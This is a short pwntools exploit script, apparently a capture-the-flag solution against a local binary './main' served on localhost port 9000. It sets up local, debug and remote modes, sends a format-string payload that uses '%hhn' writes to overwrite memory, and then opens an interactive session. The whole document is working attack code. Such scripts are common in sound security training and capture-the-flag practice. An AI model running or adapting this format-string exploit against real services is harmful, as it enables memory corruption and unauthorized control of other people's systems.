from pwn import*
context.arch="amd64"
import shutil

# This resolves the absolute path (e.g., /usr/bin/kitty) and tricks pwntools into ignoring it
context.terminal = [shutil.which('kitty'), 'sh', '-c']
b="./main"
#l = libc = ELF("./libc.so.6")
elf = e = context.binary = ELF(b)
DEBUG=1 # 0 remote , 1 local , 2 local + gdb
nc="nc localhost 9000"
r=nc.split(" ")
if DEBUG==1:
    p=process(b)
elif DEBUG==2:
    p=process(b)
    gdb.attach(p,"""
    b* vuln + 86
    c
    x/50a $sp
    """)
    pause()
else:
    p=remote(r[1],int(r[2]),ssl=False)



payload = "%c%c%c%c%c%c%50c%hhn%136c%7$hhn" #192-50-6

p.sendline(payload)



p.interactive()
